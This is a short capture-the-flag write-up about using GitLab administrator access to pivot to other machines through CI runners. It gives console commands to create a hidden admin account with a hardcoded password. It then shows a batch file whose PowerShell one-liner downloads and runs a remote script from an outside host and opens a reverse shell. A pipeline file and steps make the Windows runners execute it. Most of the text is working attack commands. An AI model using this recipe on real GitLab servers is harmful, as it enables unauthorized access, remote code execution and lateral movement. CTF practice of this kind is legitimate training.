In one CTF challenge I gained access to Git-lab as administrator and from there I managed to pivot to other machines via runners.

### Requirements --> Skip if you have an admin account!
Add a new user via git-lab command in OS:
`gitlab-rails console`
`user = User.new(`
  `username: 'culo',`
  `email: 'culo@test.com',`
  `name: 'Culo Rotto',`
  `password: 'Coglione1!',`
  `password_confirmation: 'Coglione1!'`
`)`
`user.skip_confirmation!`
`user.save!`
`exit`

Make the user ad admin:
`gitlab-rails console`
`user = User.find_by(username: 'culo')`
`user.admin = true`
`user.save!`
`exit`

### Setup a new dummy project with 2 files:
`shell.bat:  --> This will invoke a shell`
`powershell.exe IEX(IWR http://10.9.20.13:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.5 80`


`.gitlab-ci.yml:  --> This tells to the pipelines to execute my script via runners`
`stages:`
  - `build`

`build_job:`
  `stage: build`
  `tags:`
    `- windows`
  `script:`
    `- ./shell.bat`

### From Admin  Area -> Overview -> runners
Check that there are runners that can be used, what tags are needed(this is important as otherwise it might not run if "Run untagged jobs" is active)

### *Extra*
if tags are needed from step 3 add them to you repository to match, or just disable the run untagged jobs" checkbox.

### Open your project and go to
Pipelines -> Run pipelines -> Choose all default and finish.
This should execute the shell upon compiling and get you a shell! You can check the job status from you repository --> Jobs and choose the last one to see the verbose console status!
